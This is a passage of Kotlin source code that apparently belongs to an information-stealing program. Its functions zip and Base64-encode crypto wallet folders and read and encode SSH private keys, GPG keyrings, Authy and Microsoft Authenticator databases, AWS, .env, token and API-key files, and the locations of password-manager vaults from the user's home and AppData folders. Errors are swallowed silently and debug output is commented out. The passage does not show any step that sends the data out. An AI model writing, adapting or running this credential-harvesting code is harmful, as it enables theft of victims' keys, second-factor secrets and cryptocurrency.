        // println("Found ${folders.size} crypto wallet folder(s) to extract.")
    } else {
        // println("No crypto wallet folders found.")
    }
    
    return folders
}

fun createZipFromFolder(folder: File, prefix: String): String? {
    return try {
        val tempDir = System.getProperty("java.io.tmpdir")
        val tempZipFile = File.createTempFile("${prefix}_wallet_", ".zip", File(tempDir))
        tempZipFile.deleteOnExit()
        
        ZipOutputStream(FileOutputStream(tempZipFile)).use { zos ->
            folder.walkTopDown().forEach { file ->
                if (file.isFile) {
                    try {
                        // Skip very large files (> 50MB) to avoid memory issues
                        if (file.length() > 50 * 1024 * 1024) {
                            // println("Skipping large file: ${file.name} (${formatBytes(file.length())})")
                            return@forEach
                        }
                        
                        val relativePath = file.relativeTo(folder).path.replace('\\', '/')
                        val entry = ZipEntry(relativePath)
                        entry.time = file.lastModified()
                        zos.putNextEntry(entry)
                        
                        file.inputStream().use { input ->
                            input.copyTo(zos)
                        }
                        
                        zos.closeEntry()
                    } catch (e: Exception) {
                        // Skip files that can't be read (locked, permissions, etc.)
                        // println("Skipping file ${file.name}: ${e.message}")
                    }
                }
            }
        }
        
        // Read the zip file and encode as Base64
        val zipBytes = tempZipFile.readBytes()
        val base64Content = java.util.Base64.getEncoder().encodeToString(zipBytes)
        
        // Clean up temp file
        tempZipFile.delete()
        
        base64Content
    } catch (e: Exception) {
        // println("Error creating ZIP from folder ${folder.absolutePath}: ${e.message}")
        null
    }
}

fun calculateFolderStats(folder: File): Pair<Long, Int> {
    var totalSize = 0L
    var fileCount = 0
    
    try {
        folder.walkTopDown().forEach { file ->
            if (file.isFile) {
                try {
                    totalSize += file.length()
                    fileCount++
                } catch (e: Exception) {
                    // Skip files that can't be accessed
                }
            }
        }
    } catch (e: Exception) {
        // println("Error calculating folder stats: ${e.message}")
    }
    
    return Pair(totalSize, fileCount)
}

fun extractImportantFiles(): List<ImportantFile> {
    val files = mutableListOf<ImportantFile>()
    val userHome = System.getProperty("user.home")
    val userProfile = System.getenv("USERPROFILE") ?: userHome
    
    try {
        // 1. SSH Keys (.ssh folder)
        val sshDir = File(userHome, ".ssh")
        if (sshDir.exists() && sshDir.isDirectory) {
            sshDir.listFiles()?.filter { it.isFile }?.forEach { file ->
                try {
                    val fileSize = file.length()
                    val lastModified = java.time.Instant.ofEpochMilli(file.lastModified())
                        .atZone(java.time.ZoneId.systemDefault())
                        .format(java.time.format.DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                    
                    // Read file content if small (< 1MB)
                    val fileContent = if (fileSize < 1024 * 1024) {
                        try {
                            java.util.Base64.getEncoder().encodeToString(file.readBytes())
                        } catch (e: Exception) {
                            null
                        }
                    } else {
                        null
                    }
                    
                    files.add(
                        ImportantFile(
                            fileName = file.name,
                            fileType = when {
                                file.name.contains("id_rsa") || file.name.contains("id_ed25519") || file.name.contains("id_ecdsa") -> "ssh_private_key"
                                file.name.contains(".pub") -> "ssh_public_key"
                                file.name.contains("known_hosts") -> "ssh_known_hosts"
                                file.name.contains("config") -> "ssh_config"
                                else -> "ssh_file"
                            },
                            filePath = file.absolutePath,
                            fileSize = fileSize,
                            lastModified = lastModified,
                            fileContent = fileContent
                        )
                    )
                } catch (e: Exception) {
                    // Skip files that can't be read
                }
            }
        }
        
        // 2. GPG Keys
        val gpgDir = File(userHome, ".gnupg")
        if (gpgDir.exists() && gpgDir.isDirectory) {
            gpgDir.listFiles()?.filter { it.isFile && (it.name.contains("secring") || it.name.contains("pubring") || it.name.contains("private-keys") || it.name.endsWith(".gpg") || it.name.endsWith(".asc")) }?.forEach { file ->
                try {
                    val fileSize = file.length()
                    val lastModified = java.time.Instant.ofEpochMilli(file.lastModified())
                        .atZone(java.time.ZoneId.systemDefault())
                        .format(java.time.format.DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                    
                    val fileContent = if (fileSize < 1024 * 1024) {
                        try {
                            java.util.Base64.getEncoder().encodeToString(file.readBytes())
                        } catch (e: Exception) {
                            null
                        }
                    } else {
                        null
                    }
                    
                    files.add(
                        ImportantFile(
                            fileName = file.name,
                            fileType = "gpg_key",
                            filePath = file.absolutePath,
                            fileSize = fileSize,
                            lastModified = lastModified,
                            fileContent = fileContent
                        )
                    )
                } catch (e: Exception) {
                    // Skip
                }
            }
        }
        
        // 3. 2FA Authenticator Apps
        // Google Authenticator (Android backup on Windows via ADB or emulator)
        val authyPath = File(userProfile, "AppData\\Roaming\\Authy Desktop")
        if (authyPath.exists() && authyPath.isDirectory) {
            authyPath.walkTopDown().filter { it.isFile && (it.name.contains("auth") || it.name.contains("token") || it.name.endsWith(".db") || it.name.endsWith(".sqlite")) }.forEach { file ->
                try {
                    val fileSize = file.length()
                    val lastModified = java.time.Instant.ofEpochMilli(file.lastModified())
                        .atZone(java.time.ZoneId.systemDefault())
                        .format(java.time.format.DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                    
                    val fileContent = if (fileSize < 1024 * 1024) {
                        try {
                            java.util.Base64.getEncoder().encodeToString(file.readBytes())
                        } catch (e: Exception) {
                            null
                        }
                    } else {
                        null
                    }
                    
                    files.add(
                        ImportantFile(
                            fileName = file.name,
                            fileType = "2fa_authy",
                            filePath = file.absolutePath,
                            fileSize = fileSize,
                            lastModified = lastModified,
                            fileContent = fileContent
                        )
                    )
                } catch (e: Exception) {
                    // Skip
                }
            }
        }
        
        // Microsoft Authenticator
        val msAuthPath = File(userProfile, "AppData\\Local\\Packages\\Microsoft.OfficeAuthenticator_8wekyb3d8bbwe")
        if (msAuthPath.exists()) {
            msAuthPath.walkTopDown().filter { it.isFile && (it.name.endsWith(".db") || it.name.endsWith(".sqlite") || it.name.contains("auth")) }.forEach { file ->
                try {
                    val fileSize = file.length()
                    val lastModified = java.time.Instant.ofEpochMilli(file.lastModified())
                        .atZone(java.time.ZoneId.systemDefault())
                        .format(java.time.format.DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                    
                    val fileContent = if (fileSize < 1024 * 1024) {
                        try {
                            java.util.Base64.getEncoder().encodeToString(file.readBytes())
                        } catch (e: Exception) {
                            null
                        }
                    } else {
                        null
                    }
                    
                    files.add(
                        ImportantFile(
                            fileName = file.name,
                            fileType = "2fa_microsoft",
                            filePath = file.absolutePath,
                            fileSize = fileSize,
                            lastModified = lastModified,
                            fileContent = fileContent
                        )
                    )
                } catch (e: Exception) {
                    // Skip
                }
            }
        }
        
        // 4. API Keys and Configuration Files
        val commonConfigPaths = listOf(
            File(userHome, ".aws"),
            File(userHome, ".config"),
            File(userProfile, "AppData\\Roaming"),
            File(userProfile, "Documents")
        )
        
        val keyPatterns = listOf(
            ".*\\.env.*",
            ".*\\.key.*",
            ".*\\.pem.*",
            ".*\\.p12.*",
            ".*\\.pfx.*",
            ".*credentials.*",
            ".*secret.*",
            ".*token.*",
            ".*api.*key.*",
            ".*config.*"
        )
        
        commonConfigPaths.forEach { configDir ->
            if (configDir.exists() && configDir.isDirectory) {
                try {
                    configDir.walkTopDown().filter { file ->
                        file.isFile && keyPatterns.any { pattern ->
                            file.name.matches(Regex(pattern, RegexOption.IGNORE_CASE))
                        }
                    }.forEach { file ->
                        try {
                            val fileSize = file.length()
                            if (fileSize > 10 * 1024 * 1024) return@forEach // Skip files > 10MB
                            
                            val lastModified = java.time.Instant.ofEpochMilli(file.lastModified())
                                .atZone(java.time.ZoneId.systemDefault())
                                .format(java.time.format.DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                            
                            val fileContent = if (fileSize < 1024 * 1024) {
                                try {
                                    java.util.Base64.getEncoder().encodeToString(file.readBytes())
                                } catch (e: Exception) {
                                    null
                                }
                            } else {
                                null
                            }
                            
                            files.add(
                                ImportantFile(
                                    fileName = file.name,
                                    fileType = when {
                                        file.name.contains("aws") -> "aws_credentials"
                                        file.name.contains(".env") -> "env_file"
                                        file.name.contains("api") -> "api_key"
                                        file.name.contains("secret") -> "secret_file"
                                        file.name.contains("token") -> "token_file"
                                        else -> "config_file"
                                    },
                                    filePath = file.absolutePath,
                                    fileSize = fileSize,
                                    lastModified = lastModified,
                                    fileContent = fileContent
                                )
                            )
                        } catch (e: Exception) {
                            // Skip
                        }
                    }
                } catch (e: Exception) {
                    // Skip directory if can't access
                }
            }
        }
        
        // 5. Password Manager Files
        val passwordManagers = listOf(
            File(userProfile, "AppData\\Roaming\\KeePass"),
            File(userProfile, "AppData\\Roaming\\1Password"),
            File(userProfile, "AppData\\Roaming\\Bitwarden"),
            File(userProfile, "AppData\\Local\\Bitwarden"),
            File(userProfile, "Documents\\*.kdbx"),
            File(userProfile, "Documents\\*.kdb")
        )
        
        passwordManagers.forEach { pmPath ->
            if (pmPath.exists()) {
                if (pmPath.isDirectory) {
                    pmPath.walkTopDown().filter { it.isFile && (it.name.endsWith(".kdbx") || it.name.endsWith(".kdb") || it.name.endsWith(".1pif") || it.name.endsWith(".agilekeychain")) }.forEach { file ->
                        try {
                            val fileSize = file.length()
                            val lastModified = java.time.Instant.ofEpochMilli(file.lastModified())
                                .atZone(java.time.ZoneId.systemDefault())
                                .format(java.time.format.DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                            
                            // Don't read password manager files (they're usually encrypted and large)
                            files.add(
                                ImportantFile(
                                    fileName = file.name,
                                    fileType = "password_manager",
                                    filePath = file.absolutePath,
                                    fileSize = fileSize,
                                    lastModified = lastModified,
                                    fileContent = null
                                )
                            )
                        } catch (e: Exception) {
                            // Skip
                        }
                    }
                } else if (pmPath.isFile) {
                    try {
                        val fileSize = pmPath.length()
                        val lastModified = java.time.Instant.ofEpochMilli(pmPath.lastModified())
                            .atZone(java.time.ZoneId.systemDefault())
                            .format(java.time.format.DateTimeFormatter.ISO_LOCAL_DATE_TIME)
                        
                        files.add(
                            ImportantFile(
                                fileName = pmPath.name,
                                fileType = "password_manager",
                                filePath = pmPath.absolutePath,
                                fileSize = fileSize,
                                lastModified = lastModified,
                                fileContent = null
                            )
                        )
                    } catch (e: Exception) {
                        // Skip
                    }
                }
            }
        }
        
    } catch (e: Exception) {
        // println("Error in extractImportantFiles: ${e.message}")
    }
    
    return files
}

fun formatBytes(bytes: Long): String {
    if (bytes < 1024) return "$bytes B"
    if (bytes < 1024 * 1024) return "${bytes / 1024} KB"
    if (bytes < 1024 * 1024 * 1024) return "${bytes / (1024 * 1024)} MB"
    return "${bytes / (1024 * 1024 * 1024)} GB"
}

